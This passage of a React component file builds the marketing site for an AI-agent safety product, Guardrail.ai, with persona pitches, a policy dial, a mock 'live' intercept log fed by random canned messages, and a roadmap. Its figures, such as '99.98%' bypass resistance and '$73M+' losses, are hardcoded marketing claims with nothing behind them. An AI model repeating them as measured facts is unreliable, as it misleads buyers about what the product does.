                    <h4 className="text-sm font-black italic uppercase">Speculative Defense</h4>
                    <p className="text-[10px] opacity-60 leading-relaxed font-medium">
                        By running speculative audits ahead of tool execution, we reduce intercept latency where others lag.
                    </p>
                </div>
            </div>
        </div>
    );
};

/* --- IDEO LENS: HUMAN-CENTERED DESIGN COMPONENTS --- */

// Persona Journey Hub
export const PersonaJourneyHub = ({
    activePersona,
    onPersonaSelect
}: {
    activePersona: string,
    onPersonaSelect: (p: string) => void
}) => {
    const personas = [
        {
            id: 'cto',
            label: 'Chief Technology Officer',
            icon: Shield,
            focus: 'Dominance & Liability',
            desc: 'Neutralize systemic risk and secure institutional dominance with hardware-anchored audit trails.'
        },
        {
            id: 'engineer',
            label: 'AI Safety Engineer',
            icon: Cpu,
            focus: 'Frictionless Oversight',
            desc: 'Detect semantic drift and intercept adversarial intent in 2.1ms without breaking developer velocity.'
        },
        {
            id: 'compliance',
            label: 'Compliance Officer',
            icon: Lock,
            focus: 'Audit Finality',
            desc: 'Generate NIST-compliant forensic proofs and maintain absolute judicial finality in every transaction.'
        },
        {
            id: 'pm',
            label: 'Product Manager',
            icon: Target,
            focus: 'Acceleration & Trust',
            desc: 'Build user trust and accelerate agentic deployment with a transparent, sovereign safety layer.'
        }
    ];

    return (
        <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6 py-12">
            {personas.map(p => (
                <button
                    key={p.id}
                    onClick={() => onPersonaSelect(p.id)}
                    className={`persona-card ${activePersona === p.id ? 'active' : ''}`}
                >
                    <div className="flex flex-col h-full gap-4">
                        <div className="flex items-center justify-between">
                            <p.icon size={24} className={activePersona === p.id ? 'text-emerald-400' : 'opacity-40'} />
                            <span className="text-[8px] font-black uppercase tracking-[0.2em] opacity-30">{p.focus}</span>
                        </div>
                        <div className="flex flex-col gap-2 text-left">
                            <h4 className="text-xs font-black uppercase tracking-widest">{p.label}</h4>
                            <p className="text-[10px] opacity-60 leading-relaxed font-medium">
                                {p.desc}
                            </p>
                        </div>
                        {activePersona === p.id && (
                            <motion.div layoutId="persona-active" className="mt-auto h-1 w-full bg-emerald-400 rounded-full" />
                        )}
                    </div>
                </button>
            ))}
        </div>
    );
};

// Problem Solution Narrative
export const ProblemSolutionNarrative = ({ persona }: { persona: string }) => {
    const narratives = {
        cto: {
            problem: "Hidden systemic liabilities in autonomous agents are costing enterprises $73M+ annually in unhedged risk exposure.",
            emotional: "The board demands absolute certainty. A single adversarial drift could trigger a catastrophic treasury drain.",
            solution: "GuardrailAI's hardware-anchored VPC prevents $14.8M in liability per drill via zero-cycle interception."
        },
        engineer: {
            problem: "Manual governance kills velocity. Existing safety layers introduce 500ms+ latency, breaking real-time agentic loops.",
            emotional: "You're forced to choose between shipping fast or shipping safe. Every delay feels like a missed opportunity.",
            solution: "Sovereign Circuit Breakers offer 2.1ms P99 latency—intercepting drift before it ever touches the transaction layer."
        },
        compliance: {
            problem: "Regulatory audits are reactive, not proactive. Proving model alignment to regulators takes months of forensic mapping.",
            emotional: "The pressure of the EU AI Act is mounting. One non-compliant tool-call could result in million-dollar fines.",
            solution: "Automated NIST Forensic Proofs provide an EFI-locked, SPHINCS+-signed audit trail of every decision."
        },
        pm: {
            problem: "Users are hesitant to adopt agentic features due to 'black-box' fears. Trust is the primary bottleneck for product scaling.",
            emotional: "Your innovation is stalled by perception. Without trust, your most transformative features stay in the sandbox.",
            solution: "Transparent Sovereign Signals (Emerald/Amber/Red) give users human-readable confidence in AI autonomy."
        }
    };

    const n = narratives[persona as keyof typeof narratives] || narratives.cto;

    return (
        <div className="flex flex-col gap-24 py-32 border-y border-white/5">
            <div className="grid lg:grid-cols-3 gap-16">
                <div className="flex flex-col gap-6 p-10 glass-morphism border-red-500/10 hover:border-red-500/30 transition-all group">
                    <span className="text-[10px] font-black text-red-500 uppercase tracking-[0.5em] group-hover:animate-pulse">The Friction</span>
                    <p className="text-lg opacity-80 leading-relaxed italic">&quot;{n.problem}&quot;</p>
                </div>
                <div className="flex flex-col gap-6 p-10 glass-morphism border-amber-500/10 hover:border-amber-500/30 transition-all group">
                    <span className="text-[10px] font-black text-amber-400 uppercase tracking-[0.5em] group-hover:animate-bounce">The Stake</span>
                    <p className="text-lg opacity-80 leading-relaxed italic">&quot;{n.emotional}&quot;</p>
                </div>
                <div className="flex flex-col gap-6 p-10 glass-morphism border-emerald-500/20 bg-emerald-500/5 group">
                    <span className="text-[10px] font-black text-emerald-400 uppercase tracking-[0.5em] group-hover:scale-105 transition-transform origin-left">The Relief</span>
                    <p className="text-lg text-emerald-400 leading-relaxed italic font-bold tracking-tight">&quot;{n.solution}&quot;</p>
                </div>
            </div>
        </div>
    );
};

// Day In The Life Visualizer
export const DayInTheLifeVisualizer = () => {
    const [isHardened, setIsHardened] = useState(false);

    return (
        <div className="flex flex-col gap-12 py-24">
            <div className="flex items-center justify-between">
                <div className="flex flex-col gap-2">
                    <h3 className="text-2xl font-black italic uppercase text-emerald-400">Day in the Life: Agentic Velocity</h3>
                    <ExecutiveSubtitle text="Contrast your existing exposure against Sovereign Protection." />
                </div>
                <button
                    onClick={() => setIsHardened(!isHardened)}
                    className={`px-8 py-4 font-black uppercase text-xs transition-all ${isHardened ? 'bg-emerald-500 text-black shadow-[4px_4px_0_#fff]' : 'bg-red-500 text-white shadow-[4px_4px_0_#fff]'}`}
                >
                    {isHardened ? 'SOVEREIGN_MODE: ON' : 'LEGACY_MODE: EXPOSED'}
                </button>
            </div>

            <div className="grid lg:grid-cols-2 gap-1 h-[500px] brutalist-border overflow-hidden">
                {/* Left Side: Reality */}
                <div className={`relative p-12 transition-all duration-1000 flex flex-col gap-8 ${isHardened ? 'opacity-20 grayscale scale-95 blur-sm' : 'opacity-100 bg-red-500/5'}`}>
                    <div className="flex items-center gap-3 text-red-500 opacity-60">
                        <Flame size={20} />
                        <span className="text-[10px] font-black uppercase tracking-widest">Unprotected Ecosystem</span>
                    </div>

                    <div className="flex-1 flex flex-col gap-6">
                        <div className="p-6 border border-white/10 glass-morphism">
                            <p className="text-xs opacity-60">09:12 AM — Model Drift Detected in Production</p>
                            <p className="text-sm font-bold mt-1 text-red-400">Action: Treasury transfer initiated without multi-sig.</p>
                        </div>
                        <div className="p-6 border border-red-500/20 bg-red-500/5">
                            <p className="text-xs opacity-60">11:45 AM — Emergency Board Call</p>
                            <p className="text-sm font-bold mt-1">Status: Manual verification blocked. Fines pending.</p>
                        </div>
                        <div className="p-6 border border-white/10 glass-morphism opacity-30">
                            <p className="text-xs opacity-60">04:30 PM — Post-Mortem Analysis</p>
                            <p className="text-sm font-bold mt-1">Result: Forensic link missing. Liability unhedged.</p>
                        </div>
                    </div>
                </div>

                {/* Right Side: Sovereign Trust */}
                <div className={`relative p-12 transition-all duration-1000 flex flex-col gap-8 ${!isHardened ? 'opacity-20 grayscale scale-95 blur-sm' : 'opacity-100 bg-emerald-500/5'}`}>
                    <div className="flex items-center gap-3 text-emerald-400">
                        <ShieldAlert size={20} className="animate-pulse" />
                        <span className="text-[10px] font-black uppercase tracking-widest">Guardrail.ai Mesh Active</span>
                    </div>

                    <div className="flex-1 flex flex-col gap-6">
                        <div className="p-6 border border-emerald-500/30 bg-emerald-500/10">
                            <p className="text-xs text-emerald-400/60 uppercase font-black">09:12 AM — Veto Triggered</p>
                            <p className="text-sm font-bold mt-1 text-emerald-400">Trinity Consensus: 0.8ms Veto issued. Action Hard-Blocked.</p>
                        </div>
                        <div className="p-6 border border-white/20 glass-morphism">
                            <p className="text-xs opacity-60">11:45 AM — Automated Board Update</p>
                            <p className="text-sm font-bold mt-1">Status: Institutional stability maintained. $0 liability.</p>
                        </div>
                        <div className="p-6 border border-white/20 glass-morphism">
                            <p className="text-xs opacity-60">04:30 PM — NIST Proof Exported</p>
                            <p className="text-sm font-bold mt-1">Result: Compliance finalized in zero cycles.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

/* --- PHASE 115: SOVEREIGN COMMAND CONSOLE COMPONENTS --- */

// Global Policy Dial (CTO)
export const GlobalPolicyDial = () => {
    const [level, setLevel] = useState(2); // 0-3
    const modes = [
        { label: 'DORMANT', color: 'text-slate-500', desc: 'No active interception. Observation only.' },
        { label: 'LOG_ONLY', color: 'text-amber-500', desc: 'Drift logged to WORM archive. No Veto.' },
        { label: 'ACTIVE_INTERVENTION', color: 'text-emerald-400', desc: 'Veto issued on semantic divergence > 40%.' },
        { label: 'SOVEREIGN_LOCK', color: 'text-red-500', desc: 'Full-stop on any tool-call without Trinity Consensus.' }
    ];

    return (
        <div className="flex flex-col gap-8 p-12 glass-morphism brutalist-border bg-black/40 h-full relative overflow-hidden group">
            <div className="flex justify-between items-start">
                <div className="flex flex-col gap-2">
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] opacity-40">Systemic Policy Registry</span>
                    <h3 className="text-2xl font-black italic uppercase">Risk Thresholding</h3>
                </div>
                <div className={`text-4xl font-black ${modes[level].color} animate-pulse`}>
                    0{level + 1}
                </div>
            </div>

            <div className="flex-1 flex items-center justify-center py-8">
                <div className="relative w-48 h-48">
                    {/* Dial Ring */}
                    <div className="absolute inset-0 rounded-full border-4 border-dashed border-white/10 group-hover:rotate-180 transition-transform duration-[4s]" />
                    <div className="absolute inset-4 rounded-full border-2 border-white/5" />

                    {/* Indicators */}
                    {modes.map((m, i) => (
                        <div
                            key={i}
                            className={`absolute inset-0 flex justify-center pt-2 transition-all duration-500`}
                            style={{ transform: `rotate(${i * 90}deg)` }}
                        >
                            <div className={`w-1 h-4 rounded-full ${level === i ? 'bg-emerald-400' : 'bg-white/10'}`} />
                        </div>
                    ))}

                    {/* Central Control */}
                    <button
                        onClick={() => setLevel((level + 1) % 4)}
                        className="absolute inset-10 rounded-full bg-white/5 border border-white/20 flex flex-col items-center justify-center gap-1 hover:bg-white/10 active:scale-95 transition-all"
                    >
                        <Settings className="text-white/40 mb-2" size={18} />
                        <span className="text-[8px] font-black uppercase text-white/60 tracking-widest">Adjust</span>
                    </button>

                    {/* Pointer */}
                    <div
                        className="absolute inset-0 transition-transform duration-700 pointer-events-none"
                        style={{ transform: `rotate(${level * 90}deg)` }}
                    >
                        <div className="absolute top-2 left-1/2 -translate-x-1/2 w-4 h-4 rounded-full bg-emerald-400 blur-md opacity-60" />
                    </div>
                </div>
            </div>

            <div className="flex flex-col gap-4">
                <p className={`text-sm font-black uppercase tracking-widest ${modes[level].color}`}>
                    MODE: {modes[level].label}
                </p>
                <p className="text-[10px] opacity-60 leading-relaxed italic">
                    &quot;{modes[level].desc}&quot;
                </p>
            </div>

            <div className="absolute -right-12 -bottom-12 w-32 h-32 bg-emerald-500/5 rounded-full blur-3xl" />
        </div>
    );
};

// Live Intercept Debugger (Engineer)
export const LiveInterceptDebugger = () => {
    const [logs, setLogs] = useState<{ id: number, type: string, text: string, time: string }[]>([]);

    useEffect(() => {
        const interval = setInterval(() => {
            const types = ['SIGNAL', 'DRIFT_VETO', 'INTERCEPT', 'SYNC_MESH'];
            const msgs = [
                'Semantic variance detected (0.42)',
                'Interception active: Treasury.withdraw(v2)',
                'EFI-locked state validated (0.99)',
                'Adversarial intent neutralized'
            ];
            const newLog = {
                id: Date.now(),
                type: types[Math.floor(Math.random() * types.length)],
                text: msgs[Math.floor(Math.random() * msgs.length)],
                time: new Date().toLocaleTimeString().split(' ')[0]
            };
            setLogs(prev => [newLog, ...prev].slice(0, 10));
        }, 2000);
        return () => clearInterval(interval);
    }, []);

    return (
        <div className="flex flex-col gap-8 p-12 glass-morphism brutalist-border bg-black/40 h-full">
            <div className="flex justify-between items-center">
                <div className="flex flex-col gap-2">
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] opacity-40">Live Drift Debugger</span>
                    <h3 className="text-2xl font-black italic uppercase">Trace Matrix</h3>
                </div>
                <div className="flex items-center gap-2">
                    <div className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                    <span className="text-[10px] font-black uppercase tracking-widest text-emerald-400">Streaming</span>
                </div>
            </div>

            <div className="flex-1 font-mono text-[9px] overflow-hidden flex flex-col gap-2">
                <AnimatePresence>
                    {logs.map((log) => (
                        <motion.div
                            key={log.id}
                            initial={{ x: -20, opacity: 0 }}
                            animate={{ x: 0, opacity: 1 }}
                            exit={{ opacity: 0 }}
                            className="flex items-center gap-4 py-2 border-b border-white/5 group"
                        >
                            <span className="opacity-30">[{log.time}]</span>
                            <span className={`font-black tracking-widest ${log.type === 'DRIFT_VETO' ? 'text-red-500' : 'text-emerald-400'}`}>
                                {log.type}
                            </span>
                            <span className="opacity-60 overflow-hidden text-ellipsis whitespace-nowrap group-hover:opacity-100 transition-opacity">
                                {log.text}
                            </span>
                        </motion.div>
                    ))}
                </AnimatePresence>
            </div>

            <div className="grid grid-cols-2 gap-4">
                <div className="p-4 border border-white/5 bg-white/5 flex flex-col gap-1">
                    <span className="text-[8px] opacity-40 uppercase">P99 Latency</span>
                    <span className="text-xs font-black italic">2.14ms</span>
                </div>
                <div className="p-4 border border-white/5 bg-white/5 flex flex-col gap-1">
                    <span className="text-[8px] opacity-40 uppercase">Bypass Resist</span>
                    <span className="text-xs font-black italic text-emerald-400">99.98%</span>
                </div>
            </div>
        </div>
    );
};

// Certification Vault (Auditor)
export const CertificationVault = () => {
    const [isExporting, setIsExporting] = useState(false);
    const [progress, setProgress] = useState(0);

    const handleExport = () => {
        setIsExporting(true);
        setProgress(0);
        const interval = setInterval(() => {
            setProgress(prev => {
                if (prev >= 100) {
                    clearInterval(interval);
                    setTimeout(() => setIsExporting(false), 2000);
                    return 100;
                }
                return prev + 5;
            });
        }, 100);
    };

    return (
        <div className="flex flex-col gap-8 p-12 glass-morphism brutalist-border bg-black/40 h-full">
            <div className="flex justify-between items-start">
                <div className="flex flex-col gap-2">
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] opacity-40">Forensic Proof Center</span>
                    <h3 className="text-2xl font-black italic uppercase">Judicial Vault</h3>
                </div>
                <Lock className="text-white/20" size={24} />
            </div>

            <div className="flex-1 flex flex-col gap-4">
                <div className="p-6 border border-white/5 bg-white/5 flex items-center justify-between group cursor-pointer hover:border-emerald-500/20 transition-all">
                    <div className="flex flex-col gap-1">
                        <span className="text-xs font-black italic uppercase italic">NIST-Forensic-Manifest-V9.pdf</span>
                        <span className="text-[8px] opacity-40 uppercase">Last Sync: 12 minutes ago</span>
                    </div>
                    <Download size={16} className="opacity-20 group-hover:opacity-100 group-hover:text-emerald-400 transition-all" />
                </div>
                <div className="p-6 border border-white/5 bg-white/5 flex items-center justify-between group cursor-pointer hover:border-emerald-500/20 transition-all">
                    <div className="flex flex-col gap-1">
                        <span className="text-xs font-black italic uppercase italic">EU-AI-Act-Compliance-Proof.json</span>
                        <span className="text-[8px] opacity-40 uppercase">Signed: SPHINCS+ Ed25519</span>
                    </div>
                    <Download size={16} className="opacity-20 group-hover:opacity-100 group-hover:text-emerald-400 transition-all" />
                </div>
            </div>

            <div className="mt-auto">
                {isExporting ? (
                    <div className="flex flex-col gap-4 py-4">
                        <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest text-emerald-400">
                            <span>Signing Forensic Record...</span>
                            <span>{progress}%</span>
                        </div>
                        <div className="h-2 bg-white/5 rounded-full overflow-hidden">
                            <motion.div
                                className="h-full bg-emerald-400 shadow-[0_0_15px_rgba(0,255,136,0.5)]"
                                initial={{ width: 0 }}
                                animate={{ width: `${progress}%` }}
                            />
                        </div>
                    </div>
                ) : (
                    <button
                        onClick={handleExport}
                        className="w-full py-4 bg-emerald-500 text-black font-black uppercase text-xs shadow-[6px_6px_0_#fff] hover:translate-x-1 hover:translate-y-1 hover:shadow-none transition-all"
                    >
                        Sign & Export Forensic Archive
                    </button>
                )}
            </div>
        </div>
    );
};

// Trust Velocity Monitor (PM)
export const TrustVelocityMonitor = () => {
    return (
        <div className="flex flex-col gap-8 p-12 glass-morphism brutalist-border bg-black/40 h-full relative group">
            <div className="flex justify-between items-center">
                <div className="flex flex-col gap-2">
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] opacity-40">Acceleration Analytics</span>
                    <h3 className="text-2xl font-black italic uppercase">Safety Dividend</h3>
                </div>
                <Zap className="text-amber-400 group-hover:animate-bounce transition-all" size={24} />
            </div>

            <div className="flex-1 flex flex-col gap-8 py-4">
                <div className="flex flex-col gap-2">
                    <div className="flex justify-between items-end">
                        <span className="text-[10px] font-black uppercase opacity-60">Deployment Velocity Index</span>
                        <span className="text-2xl font-black italic text-emerald-400">+42%</span>
                    </div>
                    <div className="h-1 bg-white/5 rounded-full overflow-hidden">
                        <div className="h-full w-[82%] bg-emerald-400" />
                    </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                    <div className="p-6 border border-white/5 glass-morphism flex flex-col gap-1">
                        <span className="text-[24px] font-black italic text-amber-400">12</span>
                        <span className="text-[8px] font-black uppercase opacity-40 tracking-widest">Sprints Saved / Yr</span>
                    </div>
                    <div className="p-6 border border-white/5 glass-morphism flex flex-col gap-1">
                        <span className="text-[24px] font-black italic text-white">$1.2M</span>
                        <span className="text-[8px] font-black uppercase opacity-40 tracking-widest">Liability Avoided</span>
                    </div>
                </div>
            </div>

            <p className="text-[10px] opacity-40 leading-relaxed italic border-t border-white/5 pt-6 mt-auto">
                &quot;Automated safety layers have reduced manual governance overhead from 18.2 hours/wk to 2.1ms total interception time.&quot;
            </p>
        </div>
    );
};

// Sovereign Command Console (Container)
export const SovereignCommandConsole = ({ activePersona }: { activePersona: string }) => {
    return (
        <section className="py-24 border-y border-white/5">
            <div className="flex flex-col gap-4 max-w-4xl mb-12">
                <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                    Institutional Console // Phase 115
                    <ExecutiveSubtitle text="Functional governance tools for authorized operators." />
                </h2>
            </div>

            <div className="grid lg:grid-cols-2 gap-12 min-h-[500px]">
                {/* Always prominent tool based on persona */}
                <div className="lg:col-span-1">
                    {activePersona === 'cto' && <GlobalPolicyDial />}
                    {activePersona === 'engineer' && <LiveInterceptDebugger />}
                    {activePersona === 'compliance' && <CertificationVault />}
                    {activePersona === 'pm' && <TrustVelocityMonitor />}
                </div>

                {/* Perspective context based on persona */}
                <div className="lg:col-span-1 flex flex-col gap-8 justify-center p-12 lg:p-24 border-l border-white/5">
                    <h3 className="text-3xl font-black italic uppercase leading-none">
                        {activePersona === 'cto' ? 'Institutional Risk Thresholding' :
                            activePersona === 'engineer' ? 'Real-Time Interception Metrics' :
                                activePersona === 'compliance' ? 'Evidence Chain Certification' :
                                    'The ROI of Absolute Safety'}
                    </h3>
                    <p className="text-xl opacity-60 leading-relaxed font-medium italic border-l-4 border-emerald-400 pl-8">
                        {activePersona === 'cto' ? 'Move the dial to scale governance. Guardrail.ai anchors policy at the hardware layer, ensuring that your intent is never subverted.' :
                            activePersona === 'engineer' ? 'Zero-cycle interception means you never have to trade velocity for safety. Monitor Every tool-call across the mesh.' :
                                activePersona === 'compliance' ? 'Forget reactive audits. Export NIST-grade forensic manifests instantly, verified by the SPHINCS+ immutable ledger.' :
                                    'Quantify exactly how the Sovereign Signal accelerates your roadmap by neutralizing the friction of manual oversight.'}
                    </p>
                    <div className="flex gap-4 mt-8">
                        <button className="px-8 py-3 bg-white text-black text-[10px] font-black uppercase tracking-widest hover:scale-105 transition-all">
                            Initialize Protocol
                        </button>
                        <button className="px-8 py-3 border border-white/20 text-white text-[10px] font-black uppercase tracking-widest hover:bg-white/5 transition-all">
                            View Docs
                        </button>
                    </div>
                </div>
            </div>
        </section>
    );
};

/* --- PHASE 109: INNOVATION HUB & ECOSYSTEM STRATEGY --- */

// Ecosystem Visualizer (Interactive Integration Mesh)
export const EcosystemVisualizer = () => {
    return (
        <section className="py-24 border-b border-white/5 relative overflow-hidden">
            <div className="flex flex-col gap-4 max-w-4xl mb-16 px-8 lg:px-0">
                <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                    Systemic Integration Mesh
                    <ExecutiveSubtitle text="Guardrail.ai as the universal intercept layer." />
                </h2>
                <p className="text-xl opacity-70 leading-relaxed italic">
                    Visualize how the Sovereign Signal anchors safety between your LLM providers and the institutional balance sheet.
                </p>
            </div>

            <div className="relative h-[600px] glass-morphism brutalist-border bg-black/40 overflow-hidden flex items-center justify-center mx-8 lg:mx-0">
                {/* Background Grid */}
                <div className="absolute inset-0 opacity-10" style={{ backgroundImage: 'radial-gradient(circle, #fff 1px, transparent 1px)', backgroundSize: '40px 40px' }} />

                <div className="relative w-full max-w-5xl px-12 grid grid-cols-3 gap-24 items-center">
                    {/* Left: Sources */}
                    <div className="flex flex-col gap-8">
                        <div className="p-6 border border-white/10 bg-white/5 flex flex-col gap-2 group hover:border-emerald-500/40 transition-all">
                            <span className="text-[10px] font-black uppercase opacity-40">Provider 01</span>
                            <span className="text-lg font-black italic">OpenAI / GPT-4o</span>
                        </div>
                        <div className="p-6 border border-white/10 bg-white/5 flex flex-col gap-2 group hover:border-emerald-500/40 transition-all">
                            <span className="text-[10px] font-black uppercase opacity-40">Provider 02</span>
                            <span className="text-lg font-black italic">Anthropic / Claude 3.5</span>
                        </div>
                        <div className="p-6 border border-white/10 bg-white/5 flex flex-col gap-2 group hover:border-emerald-500/40 transition-all">
                            <span className="text-[10px] font-black uppercase opacity-40">Custom</span>
                            <span className="text-lg font-black italic">Local Llama-3 (v3.1)</span>
                        </div>
                    </div>

                    {/* Center: Guardrail.ai (The Veto) */}
                    <div className="relative flex justify-center">
                        <motion.div
                            animate={{ scale: [1, 1.05, 1], rotate: [0, 2, -2, 0] }}
                            transition={{ duration: 4, repeat: Infinity }}
                            className="w-48 h-48 rounded-full border-4 border-emerald-400 bg-emerald-500/10 flex items-center justify-center p-8 text-center relative z-10"
                        >
                            <div className="flex flex-col items-center">
                                <Shield className="text-emerald-400 mb-2" size={32} />
                                <span className="text-sm font-black uppercase tracking-widest text-emerald-400 leading-tight">Sovereign<br />Intercept</span>
                            </div>

                            {/* Scanning Rings */}
                            <div className="absolute inset-[-20px] border border-emerald-500/20 rounded-full animate-ping" />
                            <div className="absolute inset-[-40px] border border-emerald-500/10 rounded-full animate-pulse" />
                        </motion.div>

                        {/* Connection Lines (Styled with SVG for animation) */}
                        <svg className="absolute inset-0 w-full h-full overflow-visible pointer-events-none" style={{ left: '-150%', width: '400%' }}>
                            <path d="M 0 100 L 400 300" stroke="rgba(0, 255, 136, 0.2)" strokeWidth="1" fill="none" />
                            <path d="M 0 300 L 400 300" stroke="rgba(0, 255, 136, 0.2)" strokeWidth="1" fill="none" />
                            <path d="M 0 500 L 400 300" stroke="rgba(0, 255, 136, 0.2)" strokeWidth="1" fill="none" />

                            <path d="M 400 300 L 800 150" stroke="rgba(0, 255, 136, 0.2)" strokeWidth="1" fill="none" />
                            <path d="M 400 300 L 800 450" stroke="rgba(0, 255, 136, 0.2)" strokeWidth="1" fill="none" />
                        </svg>
                    </div>

                    {/* Right: Destinations */}
                    <div className="flex flex-col gap-8">
                        <div className="p-8 border-2 border-emerald-500/20 bg-emerald-500/5 flex flex-col gap-2 relative">
                            <div className="absolute top-0 right-0 p-2 text-emerald-400"><Repeat size={12} /></div>
                            <span className="text-[10px] font-black uppercase opacity-40 italic">System Target</span>
                            <span className="text-lg font-black italic">Institutional Balance Sheet</span>
                            <div className="mt-4 flex items-center gap-2">
                                <div className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                                <span className="text-[8px] font-black uppercase text-emerald-400 tracking-widest">Liability Neutralized</span>
                            </div>
                        </div>
                        <div className="p-8 border border-white/10 bg-white/5 flex flex-col gap-2">
                            <span className="text-[10px] font-black uppercase opacity-40">Human Feedback</span>
                            <span className="text-lg font-black italic">Governance Board</span>
                        </div>
                    </div>
                </div>

                {/* Visualizer Metadata Footnote */}
                <div className="absolute bottom-6 right-12 flex gap-8 items-center text-[8px] font-black uppercase tracking-widest opacity-40">
                    <div className="flex items-center gap-2">
                        <Terminal size={10} />
                        <span>Mesh State: Active</span>
                    </div>
                    <div className="flex items-center gap-2">
                        <Layers size={10} />
                        <span>Intercept Layer: L1 Hardware</span>
                    </div>
                </div>
            </div>
        </section>
    );
};

// Innovation Roadmap (Future-Forward Storytelling)
export const InnovationRoadmap = () => {
    const timeline = [
        { q: 'Q2 2026', title: 'Sovereign Veto L1', desc: 'Hardware-locked interception for sub-millisecond drift control.' },
        { q: 'Q4 2026', title: 'Logic Collision Engine', desc: 'Cross-agent alignment for multi-jurisdictional compliance.' },
        { q: '2027', title: 'Total Liability Air-Gap', desc: 'Zero-manual-oversight governance for Fortune 500 agents.' },
        { q: '2028', title: 'Sovereign Sentinel Mesh', desc: 'Global federated immunity across institutional borders.' }
    ];

    return (
        <section className="py-24 border-b border-white/5 px-8 lg:px-0">
            <div className="flex flex-col gap-4 max-w-4xl mb-16">
                <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                    Innovation Roadmap
                    <ExecutiveSubtitle text="The future of institutional safety leadership." />
                </h2>
            </div>

            <div className="grid md:grid-cols-4 gap-8">
                {timeline.map((item, i) => (
                    <div key={i} className="flex flex-col gap-6 group">
                        <div className="flex items-end gap-2">
                            <span className="text-5xl font-black italic border-b-4 border-emerald-400 leading-none">{item.q.split(' ')[0]}</span>
                            <span className="text-xs font-black uppercase opacity-40 mb-1">{item.q.split(' ')[1]}</span>
                        </div>
                        <div className="p-8 border border-white/10 glass-morphism h-full flex flex-col gap-4 group-hover:border-emerald-500/40 transition-all">
                            <h3 className="text-lg font-black italic uppercase italic leading-tight">{item.title}</h3>
                            <p className="text-sm opacity-60 leading-relaxed italic">&quot;{item.desc}&quot;</p>
                            <div className="mt-auto pt-4 flex justify-end">
                                <ArrowUpRight className="text-white/20 group-hover:text-emerald-400 transition-colors" size={20} />
                            </div>
                        </div>
                    </div>
                ))}
            </div>
        </section>
    );
};

// Tech Hierarchy Grid (Core vs Value)
export const TechHierarchyGrid = () => {
    return (
        <section className="py-24 border-b border-white/5 px-8 lg:px-0">
            <div className="flex flex-col gap-4 max-w-4xl mb-16">
                <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                    Technology Hierarchy
                    <ExecutiveSubtitle text="Categorizing systemic seniority." />
                </h2>
            </div>

            <div className="grid lg:grid-cols-2 gap-12">
                {/* Core Infrastructure */}
                <div className="flex flex-col gap-8">
                    <div className="flex items-center gap-4 text-emerald-400">
                        <div className="w-12 h-1 bg-emerald-400" />
                        <span className="text-[10px] font-black uppercase tracking-[0.4em]">Core Infrastructure</span>
                    </div>
                    <div className="grid gap-4">
                        <div className="p-8 bg-emerald-500/5 border border-emerald-500/20 brutalist-border flex flex-col gap-2">
                            <h4 className="font-black italic uppercase italic">The Sovereign Lattice</h4>
                            <p className="text-xs opacity-60 italic">L1 Hardware synchronization layer for absolute governance anchoring.</p>
                        </div>
                        <div className="p-8 bg-emerald-500/5 border border-emerald-500/20 brutalist-border flex flex-col gap-2">
                            <h4 className="font-black italic uppercase italic">Trinity Consensus V2</h4>
                            <p className="text-xs opacity-60 italic">Triangulated intent validation for uncompromisable rule enforcement.</p>
                        </div>
                        <div className="p-8 bg-emerald-500/5 border border-emerald-500/20 brutalist-border flex flex-col gap-2">
                            <h4 className="font-black italic uppercase italic">WORM Forensic Archive</h4>
                            <p className="text-xs opacity-60 italic">Immutable Write-Once-Read-Many truth storage for legal defense.</p>
                        </div>
                    </div>
                </div>

                {/* Value-Added Features */}
                <div className="flex flex-col gap-8">
                    <div className="flex items-center gap-4 text-white/40">
                        <div className="w-12 h-1 bg-white/20" />
                        <span className="text-[10px] font-black uppercase tracking-[0.4em]">Value-Added Services</span>
                    </div>
                    <div className="grid gap-4">
                        <div className="p-8 bg-white/5 border border-white/10 brutalist-border flex flex-col gap-2">
                            <h4 className="font-black italic uppercase italic">Agentic Insurance Oracle</h4>
                            <p className="text-xs opacity-60 italic">Automated risk-adjusted policy underwriting for agentic failure.</p>
                        </div>
                        <div className="p-8 bg-white/5 border border-white/10 brutalist-border flex flex-col gap-2">
                            <h4 className="font-black italic uppercase italic">Multimodal Vibe Monitor</h4>
                            <p className="text-xs opacity-60 italic">Soft-signal analysis for human-alignment and safety cultural markers.</p>
                        </div>
                        <div className="p-8 bg-white/5 border border-white/10 brutalist-border flex flex-col gap-2">
                            <h4 className="font-black italic uppercase italic">Global Standard Connect</h4>
                            <p className="text-xs opacity-60 italic">One-click compliance exports for NIST, EU AI Act, and local regulations.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    );
};

// Platform Extensibility Hub (SDK/API)
export const PlatformExtensibilityHub = () => {
    return (
        <section className="py-24 border-b border-white/5 px-8 lg:px-0">
            <div className="grid lg:grid-cols-2 gap-24 items-center">
                <div className="flex flex-col gap-8">
                    <div className="flex flex-col gap-4">
                        <h2 className="text-sm font-black tracking-[0.4em] text-emerald-400 uppercase">
                            Platform Extensibility
                            <ExecutiveSubtitle text="The SDK for Absolute Governance." />
                        </h2>
                        <h3 className="text-4xl font-black italic uppercase leading-tight">Build atop the Sovereign Signal.</h3>
                        <p className="text-xl opacity-60 leading-relaxed italic border-l-4 border-white/10 pl-8">
                            Integrate Guardrail.ai directly into your engineering workflows with our unified Sovereign SDK. No more reactive bolt-ons.
                        </p>
                    </div>

                    <div className="flex gap-4">
                        <div className="p-6 border border-white/10 glass-morphism flex-1 flex flex-col gap-2">
                            <code className="text-[10px] text-emerald-400">npm install @guardrail-ai/sdk</code>
                            <span className="text-[8px] font-black uppercase opacity-40">Native Types Included</span>
                        </div>
                        <div className="p-6 border border-white/10 glass-morphism flex-1 flex flex-col gap-2">
                            <code className="text-[10px] text-amber-400">GET /api/v1/veto/status</code>
                            <span className="text-[8px] font-black uppercase opacity-40">100% Swagger Coverage</span>
                        </div>
